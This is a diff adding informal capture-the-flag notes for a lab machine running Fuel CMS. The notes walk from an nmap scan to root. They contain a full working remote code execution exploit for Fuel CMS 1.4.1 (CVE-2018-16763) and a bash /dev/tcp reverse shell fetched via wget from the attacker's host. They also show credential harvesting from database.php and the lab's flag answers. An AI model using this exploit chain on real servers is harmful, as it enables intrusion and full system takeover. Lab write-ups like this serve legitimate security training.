@@ -1,0 +1,106 @@
+-----------------IGNITE------------------
+---------------IP ADDRESS-----------------
+				10.10.176.252
+
+Task 1:
+nmap scan
+saw port 80
+went to website
+saw fuel cms
+searchsploit fuelcms
+cp python script to ~
+mv python script to fuelCMSexplot.py
+nano fuelCMSexploit.py
+	SCRIPT IS DAMN BROKEN!!!
+	FIX SCRIPT
+# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
+# Date: 2019-07-19
+# Exploit Author: 0xd0ff9
+# Vendor Homepage: https://www.getfuelcms.com/
+# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
+# Version: <= 1.4.1
+# Tested on: Ubuntu - Apache2 - php5
+# CVE : CVE-2018-16763
+
+
+import requests
+import urllib
+
+url = "http://10.10.176.252"
+def find_nth_overlapping(haystack, needle, n):
+    start = haystack.find(needle)
+    while start >= 0 and n > 1:
+        start = haystack.find(needle, start+1)
+        n -= 1
+    return start
+
+while 1:
+        xxxx = raw_input('cmd:')
+        burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
+        #proxy = {"http":"http://127.0.0.1:8080"}
+        r = requests.get(burp0_url)#, proxies=proxy)
+
+        html = "<!DOCTYPE html>"
+        htmlcharset = r.text.find(html)
+
+        begin = r.text[0:20]
+        dup = find_nth_overlapping(r.text,begin,2)
+
+        print r.text[0:dup]
+		
+The two # I put in are needed, also put in correct IP and delete the port number. Script is now working
+run script
+	Python2 fuelCMSexploit.py
+cmd:whoami
+www-data
+start to look through the system, found robots.txt but I am not able to look at it
+search for bash
+	which bash
+system/bin/bash
+ 	PENTEST MONKEY TIME
+Found a rev shell but was not able to get it to talk without uploading the file
+sudo python -m SimpleHTTPServer 80
+now upload
+	bash -i >& /dev/tcp/10.6.23.228/4444 0>&1 (obviously change your IP)
+	Make sure you copy this file into the html folder (var/www/html)
+Start a listener nc -lvnp 4444
+now do a wget on target machine
+	cmd:wget http://10.6.23.228/rev.sh  
+	ls -la
+	we can see that rev.sh is not executable
+	chmod +x rev.sh
+	bash rev.sh
+Now you should have a reverse shell
+	cd /home
+	cd www
+	cat flag.txt
+	
+****************	6470e394cbf6dab6a91682cc8585059b ******************
+	
+
+Task2:
+
+Gain root access
+sudo -l
+	nothing
+getuid
+	nothing... this is not going very well
+setuid
+	not installed, crap...
+ok further research figured out we did not have a “real” terminal shell, run the python script o terminal shell...
+and.... the machine went crazy and terminated.... this sucks, oh well, time to start over...
+ok, second try and the terminal still kept going crazy, screw this real terminal thing
+lets try and see if we can find anything
+	I did a ls -la and found fuel
+	From there I looked through the fuel folders, ultimately going to application, then to config and i found a database.php in there
+	I did a cat on the database.php and was able to locate the username of root and password of mememe	
+Bad news to do a sudo su we need to be in a real terminal, back to the drawing board
+	Alright we found something that we can use
+python -c 'import pty; pty.spawn("/bin/bash")'
+	su root
+	mememe
+	cat /root/root.txt
+************************ b9bbcb33e11b80be759c4e844862482d *************************
+
+			
+
